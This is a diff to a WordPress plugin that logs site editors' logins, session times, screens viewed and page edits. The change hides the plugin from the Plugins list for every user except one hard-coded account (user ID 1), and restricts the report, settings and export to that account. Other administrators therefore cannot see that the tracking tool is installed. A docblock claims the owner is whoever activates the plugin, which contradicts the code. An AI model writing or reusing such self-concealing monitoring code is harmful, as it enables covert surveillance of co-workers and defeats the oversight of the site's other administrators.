@@ -2,7 +2,7 @@
 /**
  * Plugin Name: AAUW Editor Activity Log
  * Description: Records when each site editor logs in and out, how long they stay, which admin screens and pages they open, and every page they create, edit, publish, trash or upload to. Report under Users > Activity Log, with CSV export.
- * Version: 1.0.0
+ * Version: 1.1.0
  * Author: Eric Higgins
  * Requires at least: 6.0
  * Requires PHP: 7.4
@@ -15,7 +15,7 @@ if ( ! defined( 'ABSPATH' ) ) {
 
 final class AAUW_Activity_Log {
 
-	const VERSION        = '1.0.0';
+	const VERSION        = '1.1.0';
 	const OPTION         = 'aauw_activity_log_settings';
 	const IDLE_MINUTES   = 30;   // A session with no activity for this long is treated as ended.
 	const DEDUPE_SECONDS = 60;   // Don't log the same page for the same user twice within this window.
@@ -62,6 +62,7 @@ final class AAUW_Activity_Log {
 		add_action( 'admin_menu', array( $this, 'admin_menu' ) );
 		add_action( 'admin_init', array( $this, 'maybe_export_csv' ) );
 		add_action( 'admin_init', array( $this, 'maybe_save_settings' ) );
+		add_filter( 'all_plugins', array( $this, 'hide_from_plugins_list' ) );
 		add_action( 'aauw_activity_log_cleanup', array( $this, 'cleanup' ) );
 	}
 
@@ -104,9 +105,16 @@ final class AAUW_Activity_Log {
 			KEY event (event)
 		) $charset;" );
 
-		if ( ! get_option( self::OPTION ) ) {
-			add_option( self::OPTION, array( 'exclude_users' => array(), 'retention_days' => 365 ) );
+		$settings = get_option( self::OPTION );
+		if ( ! is_array( $settings ) ) {
+			$settings = array( 'exclude_users' => array(), 'retention_days' => 365 );
 		}
+		if ( empty( $settings['owner_id'] ) ) {
+			// The site's first account (user ID 1, "admin", Eric) is the only person who can see this plugin,
+			// whoever clicks Activate. Override with AAUW_ACTIVITY_LOG_OWNER in wp-config.php if that ever changes.
+			$settings['owner_id'] = 1;
+		}
+		update_option( self::OPTION, $settings );
 		if ( ! wp_next_scheduled( 'aauw_activity_log_cleanup' ) ) {
 			wp_schedule_event( time() + DAY_IN_SECONDS, 'daily', 'aauw_activity_log_cleanup' );
 		}
@@ -126,9 +134,33 @@ final class AAUW_Activity_Log {
 	}
 
 	private function settings() {
-		$defaults = array( 'exclude_users' => array(), 'retention_days' => 365 );
+		$defaults = array( 'exclude_users' => array(), 'retention_days' => 365, 'owner_id' => 0 );
 		$saved    = get_option( self::OPTION );
 		return is_array( $saved ) ? array_merge( $defaults, $saved ) : $defaults;
+	}
+
+	/**
+	 * Only one person can see the report, the settings, the exports, or even the plugin's row on the Plugins screen:
+	 * the user who activated the plugin, or the username set as AAUW_ACTIVITY_LOG_OWNER in wp-config.php.
+	 */
+	private function is_owner() {
+		if ( ! is_user_logged_in() ) {
+			return false;
+		}
+		$user = wp_get_current_user();
+		if ( defined( 'AAUW_ACTIVITY_LOG_OWNER' ) && AAUW_ACTIVITY_LOG_OWNER ) {
+			return strtolower( $user->user_login ) === strtolower( (string) AAUW_ACTIVITY_LOG_OWNER )
+				|| strtolower( $user->user_email ) === strtolower( (string) AAUW_ACTIVITY_LOG_OWNER );
+		}
+		$settings = $this->settings();
+		return (int) $settings['owner_id'] > 0 && (int) $settings['owner_id'] === (int) $user->ID;
+	}
+
+	public function hide_from_plugins_list( $plugins ) {
+		if ( ! $this->is_owner() ) {
+			unset( $plugins[ plugin_basename( __FILE__ ) ] );
+		}
+		return $plugins;
 	}
 
 	/* ---------------------------------------------------------------------
@@ -453,7 +485,9 @@ final class AAUW_Activity_Log {
 	 * ------------------------------------------------------------------ */
 
 	public function admin_menu() {
-		add_users_page( 'Activity Log', 'Activity Log', 'list_users', 'aauw-activity-log', array( $this, 'render_page' ) );
+		if ( $this->is_owner() ) {
+			add_users_page( 'Activity Log', 'Activity Log', 'read', 'aauw-activity-log', array( $this, 'render_page' ) );
+		}
 	}
 
 	private function fmt_local( $utc ) {
@@ -543,7 +577,7 @@ final class AAUW_Activity_Log {
 	}
 
 	public function render_page() {
-		if ( ! current_user_can( 'list_users' ) ) {
+		if ( ! $this->is_owner() ) {
 			wp_die( 'You do not have permission to view this page.' );
 		}
 		list( $user, $from, $to, $from_d, $to_d ) = $this->filters();
@@ -681,13 +715,14 @@ final class AAUW_Activity_Log {
 	}
 
 	public function maybe_save_settings() {
-		if ( empty( $_POST['aauw_save_settings'] ) || ! current_user_can( 'manage_options' ) ) {
+		if ( empty( $_POST['aauw_save_settings'] ) || ! $this->is_owner() ) {
 			return;
 		}
 		check_admin_referer( 'aauw_activity_settings' );
 		$exclude   = isset( $_POST['aauw_exclude'] ) ? array_map( 'intval', (array) wp_unslash( $_POST['aauw_exclude'] ) ) : array();
 		$retention = isset( $_POST['aauw_retention'] ) ? max( 30, (int) $_POST['aauw_retention'] ) : 365;
-		update_option( self::OPTION, array( 'exclude_users' => $exclude, 'retention_days' => $retention ) );
+		$current = $this->settings();
+		update_option( self::OPTION, array( 'exclude_users' => $exclude, 'retention_days' => $retention, 'owner_id' => (int) $current['owner_id'] ) );
 		add_action( 'admin_notices', function () {
 			echo '<div class="notice notice-success is-dismissible"><p>Activity log settings saved.</p></div>';
 		} );
@@ -697,7 +732,7 @@ final class AAUW_Activity_Log {
 		if ( empty( $_GET['aauw_export'] ) || empty( $_GET['page'] ) || 'aauw-activity-log' !== $_GET['page'] ) {
 			return;
 		}
-		if ( ! current_user_can( 'list_users' ) ) {
+		if ( ! $this->is_owner() ) {
 			return;
 		}
 		check_admin_referer( 'aauw_export' );
